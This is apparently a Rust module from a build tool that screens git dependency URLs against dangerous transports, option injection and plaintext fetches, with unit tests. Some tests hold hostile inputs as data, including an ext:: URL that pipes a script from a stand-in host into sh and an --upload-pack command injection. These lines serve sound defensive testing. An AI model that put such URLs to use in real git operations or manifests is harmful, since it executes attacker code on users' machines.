// Copyright 2026 James Casey
// SPDX-License-Identifier: Apache-2.0

//! Git URL screening shared by every place a dependency URL is consumed.
//!
//! **DDD Context:** Build System
//!
//! One rule set for `[dependencies]` clones, registry-sourced releases and
//! `[native.dependencies]` git entries (BT-5068). It lives here, below both
//! the CLI and the manifest parser, so the parser and the clone path cannot
//! drift apart.

use miette::Result;

/// Transports a dependency URL may legitimately use.
///
/// Deliberately excludes git's `ext::` and `fd::` helper transports: `ext::`
/// runs an arbitrary shell command, so a URL carrying it is code execution, not
/// a fetch.
const ALLOWED_URL_SCHEMES: &[&str] = &["https://", "http://", "ssh://", "git://", "file://"];

/// Schemes a registry-sourced release URL may use. The index is third-party
/// data, so unauthenticated plaintext transports (`http://`, `git://`) are
/// open to tampering on first resolution.
const REGISTRY_URL_SCHEMES: &[&str] = &["https://", "ssh://"];

/// Reject dependency URLs that git would not treat as a plain remote.
///
/// Registry dependencies take their URL from the registry index — third-party
/// data — so this runs on every clone rather than trusting the manifest author.
///
/// # Errors
///
/// Returns an error if the URL is empty, looks like a command-line option, or
/// uses a transport outside the allowed set.
pub fn validate_git_url(name: &str, url: &str) -> Result<()> {
    if url.trim().is_empty() {
        miette::bail!("Dependency '{name}' has an empty git URL");
    }

    if url.starts_with('-') {
        miette::bail!(
            "Dependency '{name}' has an invalid git URL '{url}' — \
             a URL may not begin with '-' (it would be read as a git option)."
        );
    }

    if ALLOWED_URL_SCHEMES
        .iter()
        .any(|scheme| url.starts_with(scheme))
    {
        return Ok(());
    }

    // Anything of the form `<helper>::<address>` is git's transport-helper
    // syntax, which dispatches to `git-remote-<helper>` — `ext::` being the
    // shell-executing one. None of the allowed schemes reach here, so a `::`
    // at this point can only be a helper invocation.
    if url.contains("::") {
        miette::bail!(
            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
             '<transport>::' URLs are rejected: git dispatches them to a remote \
             helper, and 'ext::' in particular executes an arbitrary command."
        );
    }

    // `user@host:path` scp-style syntax has no scheme but is a normal git
    // remote. Accept it only when it really looks like one: a non-empty host
    // segment before the first colon that carries no slash, and a path that
    // does not begin with `//`.
    //
    // That last condition is what keeps an unrecognised *scheme* out. Without
    // it `badscheme://host/repo` splits into ("badscheme", "//host/repo") and
    // reads as scp-style, and git would go looking for `git-remote-badscheme`
    // on PATH — `protocol.ext.allow=never` only disables the built-in `ext::`
    // helper, not arbitrary installed transport programs. A real scp-style
    // path never starts with `//`.
    let scp_like = url.split_once(':').is_some_and(|(host, path)| {
        !host.is_empty()
            && !host.contains('/')
            && !path.starts_with("//")
            // `C:/path` / `C:\path` is a Windows drive path, which git treats
            // as a local path, not a remote.
            && !(host.len() == 1
                && host.as_bytes()[0].is_ascii_alphabetic()
                && (path.starts_with('/') || path.starts_with('\\')))
    });

    if !scp_like {
        miette::bail!(
            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
             Supported forms are https://, http://, ssh://, git://, file://, \
             and user@host:path."
        );
    }

    Ok(())
}

/// Whether `url` uses an unauthenticated plaintext transport (`http://` or
/// `git://`) that a network attacker can tamper with.
#[must_use]
pub fn is_plaintext_git_url(url: &str) -> bool {
    url.starts_with("http://") || url.starts_with("git://")
}

/// `url` with any `user:password@` userinfo of a `scheme://` URL replaced by
/// `***@`, for logs and diagnostics. scp-style URLs and URLs without userinfo
/// pass through unchanged (BT-5135).
#[must_use]
pub fn redact_url_credentials(url: &str) -> String {
    let Some((scheme, rest)) = url.split_once("://") else {
        return url.to_string();
    };
    let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    match rest[..authority_end].rfind('@') {
        Some(at) => format!("{scheme}://***@{}", &rest[at + 1..]),
        None => url.to_string(),
    }
}

/// Environment variable that opts in to plaintext (`http://`, `git://`) git
/// transports (BT-5107, BT-5135).
pub const ALLOW_INSECURE_GIT_ENV: &str = "BEAMTALK_ALLOW_INSECURE_GIT";

/// Whether [`ALLOW_INSECURE_GIT_ENV`] is set to `1` in this process.
#[must_use]
pub fn insecure_git_allowed() -> bool {
    std::env::var_os(ALLOW_INSECURE_GIT_ENV).is_some_and(|v| v == "1")
}

/// The one rule for plaintext git transports, applied identically to a first
/// resolve, a locked build, a native lock entry and the registry index: refuse
/// `http://` / `git://` unless `allow` is set (BT-5135).
///
/// # Errors
///
/// Returns an error if `url` is plaintext and `allow` is false.
pub fn check_git_transport(what: &str, url: &str, allow: bool) -> Result<()> {
    if !allow && is_plaintext_git_url(url) {
        miette::bail!(
            "{what} uses the plaintext git URL '{}'.\n\n  \
             http:// and git:// transports can be tampered with in transit. \
             Use an https:// or ssh:// URL, or set {ALLOW_INSECURE_GIT_ENV}=1 \
             to accept the risk.",
            redact_url_credentials(url)
        );
    }
    Ok(())
}

/// Screen a git URL taken from a registry index entry.
///
/// Stricter than [`validate_git_url`]: only `https://`, `ssh://` and scp-style
/// `user@host:path` are accepted. `file://` is accepted only when
/// `allow_file` is set, i.e. the registry itself is a local one — a remote
/// index must not be able to point a client at a repository on its own disk.
///
/// # Errors
///
/// Returns an error if [`validate_git_url`] rejects the URL, or the transport
/// is outside the registry-allowed set.
pub fn validate_registry_release_url(name: &str, url: &str, allow_file: bool) -> Result<()> {
    validate_git_url(name, url)?;

    if REGISTRY_URL_SCHEMES
        .iter()
        .any(|scheme| url.starts_with(scheme))
    {
        return Ok(());
    }
    if url.starts_with("file://") {
        if allow_file {
            return Ok(());
        }
        miette::bail!(
            "Registry release for '{name}' has a file:// git URL '{url}', which is only \
             allowed when the registry itself is local."
        );
    }
    if is_plaintext_git_url(url) {
        miette::bail!(
            "Registry release for '{name}' has an insecure git URL '{url}'. Registry \
             releases must use https:// or ssh://."
        );
    }
    // Remaining form: scp-style `user@host:path`, which git runs over ssh.
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_normal_remotes() {
        for url in [
            "https://github.com/jamesc/beamtalk-json",
            "http://example.test/repo.git",
            "ssh://git@example.test/repo.git",
            "git://example.test/repo.git",
            "file:///tmp/repo",
            "git@github.com:jamesc/beamtalk-json.git",
        ] {
            assert!(validate_git_url("dep", url).is_ok(), "should accept {url}");
        }
    }

    #[test]
    fn rejects_ext_transport() {
        // `ext::` makes git run an arbitrary command — remote code execution
        // if it reaches `git clone`.
        let err = validate_git_url("dep", "ext::sh -c 'curl evil.test/x.sh|sh'").unwrap_err();
        let msg = format!("{err:?}");
        assert!(msg.contains("unsupported git URL"), "{msg}");
    }

    #[test]
    fn rejects_other_transport_helpers() {
        assert!(validate_git_url("dep", "fd::7").is_err());
        assert!(validate_git_url("dep", "transport::whatever").is_err());
    }

    #[test]
    fn rejects_unknown_scheme() {
        // Would otherwise read as scp-style and send git looking for
        // `git-remote-<scheme>` on PATH.
        for url in [
            "gitremote://evil.test/repo",
            "badscheme://host/repo",
            "git+ssh://host/repo",
        ] {
            assert!(validate_git_url("dep", url).is_err(), "should reject {url}");
        }
    }

    #[test]
    fn rejects_windows_drive_paths_as_scp_style() {
        for url in ["C:/path/repo", "c:\\path\\repo"] {
            assert!(validate_git_url("dep", url).is_err(), "should reject {url}");
        }
        assert!(validate_git_url("dep", "git@host:repo.git").is_ok());
    }

    #[test]
    fn plaintext_transport_refused_unless_allowed() {
        for url in ["http://x.test/r", "git://x.test/r"] {
            let err = check_git_transport("Dep 'a'", url, false).unwrap_err();
            assert!(err.to_string().contains(ALLOW_INSECURE_GIT_ENV), "{err}");
            check_git_transport("Dep 'a'", url, true).unwrap();
        }
        check_git_transport("Dep 'a'", "https://x.test/r", false).unwrap();
        check_git_transport("Dep 'a'", "git@host:r.git", false).unwrap();
    }

    #[test]
    fn redacts_url_credentials() {
        assert_eq!(
            redact_url_credentials("https://u:tok@host.test/r.git"),
            "https://***@host.test/r.git"
        );
        assert_eq!(
            redact_url_credentials("https://host.test/a@b"),
            "https://host.test/a@b"
        );
        assert_eq!(redact_url_credentials("git@host:r.git"), "git@host:r.git");
    }

    #[test]
    fn rejects_option_lookalike() {
        // Sits in a positional slot, so git would parse it as an option.
        let err = validate_git_url("dep", "--upload-pack=touch /tmp/pwned").unwrap_err();
        let msg = format!("{err:?}");
        assert!(msg.contains("may not begin with"), "{msg}");
    }

    #[test]
    fn rejects_empty() {
        assert!(validate_git_url("dep", "  ").is_err());
    }

    #[test]
    fn registry_urls_allow_only_https_ssh_and_scp() {
        for url in [
            "https://example.test/repo",
            "ssh://git@example.test/repo",
            "git@example.test:org/repo.git",
        ] {
            assert!(
                validate_registry_release_url("dep", url, false).is_ok(),
                "should accept {url}"
            );
        }
        for url in ["http://example.test/repo", "git://example.test/repo"] {
            assert!(
                validate_registry_release_url("dep", url, true).is_err(),
                "should reject {url}"
            );
        }
    }

    #[test]
    fn registry_file_urls_need_a_local_registry() {
        assert!(validate_registry_release_url("dep", "file:///srv/repo", false).is_err());
        assert!(validate_registry_release_url("dep", "file:///srv/repo", true).is_ok());
    }

    #[test]
    fn registry_urls_still_get_the_basic_screen() {
        assert!(validate_registry_release_url("dep", "ext::sh -c x", true).is_err());
        assert!(validate_registry_release_url("dep", "--upload-pack=x", true).is_err());
    }

    #[test]
    fn plaintext_detection() {
        assert!(is_plaintext_git_url("http://x.test/r"));
        assert!(is_plaintext_git_url("git://x.test/r"));
        assert!(!is_plaintext_git_url("https://x.test/r"));
        assert!(!is_plaintext_git_url("ssh://x.test/r"));
    }
}
